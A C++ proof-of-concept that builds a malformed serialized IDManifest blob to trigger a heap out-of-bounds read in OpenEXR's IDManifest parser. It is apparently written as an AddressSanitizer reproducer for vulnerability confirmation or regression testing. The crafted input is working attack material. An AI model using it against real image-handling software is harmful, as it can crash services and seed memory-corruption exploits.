/*
 * PoC: heap-buffer-overflow (CWE-125) in Imf::IDManifest parsing.
 *
 * Drives the public, IMF_EXPORT constructor
 *     Imf::IDManifest(const char* data, const char* endOfData)
 * with an in-contract serialized IDManifest blob (exactly the byte format
 * that Imf::IDManifest::serialize() produces and that the readers feed back
 * in from a file's "idManifest" attribute).
 *
 * The blob declares a string list of N=64 entries, but its index-remap
 * (RLE) table references only a single entry.  A later manifest-table entry
 * then uses a component string index of 63, which is in range for the
 * string list (< 64) but far past the end of the remap table that actually
 * backs the lookup `stringList[mapping[stringIndex]]`.
 *
 * On a fixed tree the remap table is sized to the full string list, so the
 * read is in bounds; on the vulnerable tree the remap table is grown in
 * place and the surviving bound checks the string list rather than the
 * table, so `mapping[63]` reads off the end of a 1-element heap allocation.
 */

#include <ImfIDManifest.h>

#include <exception>
#include <stdint.h>
#include <string.h>
#include <vector>

using std::vector;

static void put_i32 (vector<char>& b, int32_t v)
{
    // Xdr integers are little-endian
    b.push_back ((char) (v & 0xff));
    b.push_back ((char) ((v >> 8) & 0xff));
    b.push_back ((char) ((v >> 16) & 0xff));
    b.push_back ((char) ((v >> 24) & 0xff));
}

static void put_u32 (vector<char>& b, uint32_t v)
{
    put_i32 (b, (int32_t) v);
}

static void put_u64 (vector<char>& b, uint64_t v)
{
    for (int i = 0; i < 8; ++i)
        b.push_back ((char) ((v >> (8 * i)) & 0xff));
}

static void put_varint (vector<char>& b, uint64_t v)
{
    do
    {
        unsigned char byte = (unsigned char) (v & 127);
        v >>= 7;
        if (v > 0) byte |= 128;
        b.push_back ((char) byte);
    } while (v > 0);
}

int main (void)
{
    const int N = 64; // number of strings in the string list

    vector<char> buf;

    // --- IDManifest header ---
    put_u32 (buf, 0); // version

    // --- string list (readStringList, count prefixed) ---
    put_i32 (buf, N);                      // numberOfStrings
    for (int i = 0; i < N; ++i)            // length table: each string is 2 bytes
        put_varint (buf, 2);
    for (int i = 0; i < N; ++i)            // string data: {0x00, 'a'}
    {
        buf.push_back ((char) 0x00);       // common-prefix length 0 for expansion
        buf.push_back ('a');
    }

    // --- index-remap (RLE) table: map only entry 0 ---
    put_i32 (buf, 1);   // rleLength
    put_i32 (buf, 0);   // first
    put_i32 (buf, 0);   // last

    // --- manifest entries ---
    put_i32 (buf, 1);   // manifestEntries

    // entry 0: channels = ["x"]
    put_i32 (buf, 1);
    put_varint (buf, 1);
    buf.push_back ('x');
    // entry 0: components = ["c"]  (one component -> inner loop runs once)
    put_i32 (buf, 1);
    put_varint (buf, 1);
    buf.push_back ('c');

    buf.push_back ((char) 0); // lifetime
    put_u32 (buf, 0);         // hashScheme   (pascal string, length 0)
    put_u32 (buf, 0);         // encodingScheme(pascal string, length 0)
    buf.push_back ((char) 0); // storageScheme (0 => 64-bit ids)
    put_i32 (buf, 1);         // tableSize = 1

    put_u64 (buf, 0);         // id[0] = 0
    put_varint (buf, 63);     // component string index 63: < 64 strings, but
                              // past the end of the single-element remap table

    const char* data = buf.data ();
    const char* end  = data + buf.size ();

    // On a fixed tree this input is simply parsed, or rejected with an
    // in-contract InputExc; either way the program exits cleanly. Only a
    // genuine memory-safety fault (caught by AddressSanitizer, which aborts
    // regardless of this handler) ends the process abnormally.
    try
    {
        OPENEXR_IMF_NAMESPACE::IDManifest manifest (data, end);
        // reference the result so the call isn't optimized away
        if (manifest.size () == 0xffffffffu) return 2;
    }
    catch (const std::exception&)
    {
        return 0;
    }
    catch (...)
    {
        return 0;
    }
    return 0;
}
